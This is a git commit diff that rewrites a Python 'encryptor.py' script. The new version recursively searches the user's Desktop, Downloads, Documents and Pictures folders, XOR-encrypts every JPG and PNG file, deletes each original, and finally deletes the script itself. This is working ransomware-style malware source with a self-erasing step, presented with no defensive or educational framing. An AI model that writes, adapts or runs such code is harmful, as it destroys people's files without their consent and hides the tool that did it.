2b32ad72da5f6c8c76f636b5b38d6a39826bc2a2
Prodromos Nasis <79412734+pnasis@users.noreply.github.com>
2023-07-04 01:20:32 +0300

    Update encryptor.py

--- encryptor.py
+++ encryptor.py
@@ -1,17 +1,42 @@
-# Opening and reading the image
-file = open('image.jpg', "rb")
-image = file.read()
-file.close()
+import os
 
-# Converting the image into a bytearray using the value 48 as the key
-image = bytearray(image)
+# Directories to search for image files
+directories = ['Desktop', 'Downloads', 'Documents', 'Pictures']
+
+# Key for encryption
 key = 48
 
-# Encrypting the image
-for i, j in enumerate(image):
-    image[i] = j ^ key
+# Encrypt function
+def encrypt_file(file_path):
+    try:
+        with open(file_path, 'rb') as file:
+            image = bytearray(file.read())
+        
+        # Encrypting the image
+        for i, j in enumerate(image):
+            image[i] = j ^ key
+        
+        # Creating the new encrypted image
+        encrypted_path = os.path.splitext(file_path)[0] + '_encrypted' + os.path.splitext(file_path)[1]
+        with open(encrypted_path, 'wb') as file:
+            file.write(image)
+        
+        # Deleting the original image
+        os.remove(file_path)
+        
+        print(f"Encrypted file: {file_path}")
+    
+    except IOError:
+        print(f"Failed to encrypt file: {file_path}")
 
-# Creating the new encrypted image
-file = open('encrypted.jpg', "wb")
-file.write(image)
-file.close()
+# Iterate through directories and encrypt image files
+for directory in directories:
+    for root, dirs, files in os.walk(os.path.expanduser('~/' + directory)):
+        for file in files:
+            if file.lower().endswith(('.jpg', '.png')):
+                file_path = os.path.join(root, file)
+                encrypt_file(file_path)
+
+# Deleting the program file
+os.remove(__file__)
+print("Program self-deleted.")
